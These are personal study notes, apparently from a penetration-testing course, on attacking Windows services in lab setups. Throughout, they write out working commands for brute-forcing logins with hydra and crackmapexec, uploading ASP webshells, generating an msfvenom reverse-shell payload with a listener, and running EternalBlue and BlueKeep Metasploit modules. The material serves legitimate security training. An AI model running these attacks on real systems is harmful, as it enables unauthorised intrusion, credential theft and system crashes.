
## System/Host-based attacks
#Systemattacks #hostbasedattacks

- Looking at exploiting the system itself (Windows/Linux)
- Usually done after a network exploit (after gaining access to the network)
- Attacks are focused on exploiting inherent vulns in misconfigured OS 
- Useful when attacking a host (eg some random employee latop connected to the server which you prev accessed using a network attack)
- The host might not be running anyt except SMB (or other stuff natively built into windows ) to file share with the server, so understanding of windows is necessary
- impt for exploits where hosts do not have typical public-facing services running (HTTP/HTTPS etc)

Outline:
- Windows/Linux
	- Overview of vulns
	- Exploit these vulns
	- Priveledge escalation 
		- kernal exploitation/impersonation
	- File system vulns
	- Credential dumping
	- Lateral movement 
		- Use of credentials found to move between targets

# Windows
### Overview:
Common vulns
MS08-067(Conflicker) to MS17-010 (Eternal Blue)

Lots of legacy versions exist, fragmented nature of companies with diff unpatched vers leaves vuln

Built on C so vulnerable to common exploits:
- buffer overflow
- arbitrary code exec etc
Default install is not built to be secure (even in windows 10 etc)
Endpt protection has to be handled by the company (antivirus/firewall settings etc)

Common exploited services native to windows:
| Protocol/Service                                  | Default Ports        | Purpose                                                                         |
| ------------------------------------------------- | ------------ | ------------------------------------------------------------------------------- |
| Microsoft IIS (internet Information system)       | TCP 80/443   | Proprietary server software that runs on windows                                |
| WebDAV (web distributed authoring and versioning) | TCP 80/443   | HTTP extenstion allows web server to act as a file server                       |
| SMB/CIFS                                          | TCP 445      | Network file sharing and peripherals between computers on a LAN (eg Printers)                 |
| RDP                                               | TCP 3389     | Proprietary GUI used to remotely authenticate and interact with windows systems |
| WinRM (Remote management)                         | TCP 5986/443 | Remote management protocol for remote access to windows systems                 |
|                                                   |              |                                                                                 |


### Exploit WevDAV running on Microsoft IIS
#webdav
- IIS is a windows webserver. Functions like any web server (eg Apache or Nginx)
- Can be used for static/dynamis webpages
- developed in asp.net and PHP (can be set up to host asp or php web applicaiton)

- WebDav allows web server to function as a file server (like FTP) to allow collaborative editing etc
- Without SSL cert it runs on port 80 else with SSL it runs on 443 (ie http vs https)
- After bruteforcing auth, malicious ASP payload can be uploaded and executed  to create a reverse shell
Tools:
davtest - USed to scan auth and expl webDAV erver
cadaver - file upload/dl on-screen disp etc etc

Lab:
nmap script http-enum to scan the server
hydra to brute force auth in the /webdav/ directory found
```bash
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/
```
Davtest to see wat types of files can be uploaded
```bash
davtest -auth bob:password_123321 -url http://10.2.17.124/webdav
```
From the test prev, Txt,Asp and http files can be executed
So
Cadaver used to upload Rev shell
```bash
cadaver http://10.2.123.123/webdav
#enter username and password
#enumerate like a normal ftp server
```
Kali comes with some webshells found at:
ls -al /usr/share/webshells/

- Upload the asp shell found into the webdav server using cadaver
```cadaver
put /usr/share/webshells/asp/webshell.asp
```
Viewing the directory on the browser the webshell should be there for u to open.
Can run code in the box to execute commands on the target system
type c:\\flag.txt

#### Exploit using msf instead
1.msfvenom
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2
LPORT=1234
-f asp > shell.asp
```
Note: 32 bit is usally used as it works for both 32 and 64 bit if u dont know the target servers specification

2.Cadaver to upload shell.asp (seen above)
Clicking the shell.asp in /webdav/ executes the payload, b4 that set up listener in msfconsole

```bash
#starts metasploit and metasploit framework database (Pretty sure it starts itself but idk?? yea...dont need the front part)
service postgresql start && msfconsole
```

```bash
#set options to match the msfvenom payload
use multi/handler
set payload windows/meterpreter/reverse_tcp
set port 1234
```

2b. Or use windows/iis/iis_webdav_uplaod_asp in msfconsole to upload (everything done on its own, even deletes the payload after)

```msf
#slightly tricky
set PATH webdav/matasploit%RAND%.asp
```

### Exploit SMB running on Microsoft IIS with PsExec
#smb
SMB intro
- 2 level authentication
	1. User authentication (pword+user)
	2. Share authentication (pword to access share)
- Utilise a challenge response auth system (encrypted string is sent back to match the servers) (ie the pword used)

PsExec intro
- Microsofts lightweight replacement for telnet to execute processes remotely
- auth is performed via SMB
- similar to RDP but without GUI (ie only tru CMD)
- It is a windows util so doesnt work in linux (unless u use wine), SO 
- psexec.py is used instead --> python tool same as psexec
- ^ its a Impacket tool wow
```bash
#authenticate user
psexec.py Administrator@10.2.24.221 cmd.exe
#you will be prompted for password
```
- Very clean as its a legit login (no malicious files etc)

To get auth
- SMB brute force
	- can narrow down users to administrator (every server has this acct)
	- smb_login on msf with 
	- /usr/share/metasploit-framework/data/wordlists/common_users.txt
	- pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
If want meterpreter
- exploit/windows/smb/psexec
- Enter creds found
-  run

### SMB exploit for EternalBlue
- a group of vulnerabilities that exists in SMBv1 giving a reverse shell and elevated privs
- Used by WannaCry to attack on June 2017
- Many windows versions affected

Check if can exploit:
nmap --script=smb-vuln-ms17-010 10.10.10.12 -sV -p445

Exploit manually:
AutoBlue-MS17-010
Set it up and run
--> code can be read on github to unnderstand how it works

Metasploit exploit:
exploit/windows/smb/ms17_010_eternalblue


## RDP service
- Gui remote access protocol dev by Ms to connect/interact w remote systems
- -p 3389 or any other port (lots of admins change it from default)
- Standard windows interface provided after connecting to the system
- Can always connect but need creds to gain access

Lab:
- RDP service is not actly on the default port
- NMap cant tell wat service is running
- Only way is to connect to it using RDP or using msf RDP scanner and set port to the one needed (ie 3333 here)

- Use hydra to bf pw
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt  -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.0.24.142 -s 3333

#specifying the port is needed ifnot hydra assume the default port 3389
#also in actual work might limit bf speed (number if task) using -t 2 or 3 instead of default 16 so DOS doesnt happen
```
- hydra used freerdp to connect but the lab doesnt support it only xfreerdp
```bash
xfreerdp /u:administrator /p:qwertyuiop /v:10.0.24.142:3333
```
- A window pops up allowing u to connect to the target system

- Looks frking cool may i add

### RDP vuln CVE-2019-0708 (BlueKeep) 
- potentially allow attackers to RCE and access system/network
- exploit takes avantage of the vuln in RDP to gain access to a chunk of kernal memory allowing RCE at sytem level without auth
- Lots of illegitimate PoC's exists as Microsoft would not release PoC for a vuln they found
- MSF has a module for it to check and exploit
Note: targeting Kernal space memory and application gives elevated priv but can cause system crashes

MSF:
search bluekeep for aux and exploit
set target of windows u r targeting
```msfconsole
show tagrets
use <id>
```
Note that if the memory allocation size is too large, the xploit would crash the system (default is 250MB)

### WinRM exploit
- window remote managment over http and https
- not implemented on default
- Ease for admins to access all the nodes on a network
- usually -p5985 or 5986 if SSL is configured (ie HTTP vs HTTPS) --> Normal nmap scan wont reveal it as its not the top 1000 most common ports
- Nmap service scan also cant tell wat is the actual service running, must confirm using crackmapexec
- 2 ways to auth:
	1. Username + password
	2. Username + password hash
Exploit with crackmapexec (useful for many other windows services --> MSsql, SSH, smb, winrm )
Using a ruby script "evil-winrm" to get command shell access

```bash
#bf the password
crackmapexec winrm 10.10.11.198 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

#execute the command
crackmapexec winrm 10.10.11.198 -u administrator -p tinkerbell -x "whoami"


#to get a cmd
evil-winrm.rb -u administrator -p 'tinkerbell' -i 10.2.18.19
```

Meterpreter session with available credentials
```msfconsole
search winrm_script_exec

#force the module to use a visual basic command stager needs this to work (???)
#sends the payload in VBS format rather than default powershell. Useful if powershell is restricted or disabled but VBS is allowed to run

set FORCE_VBS true
```


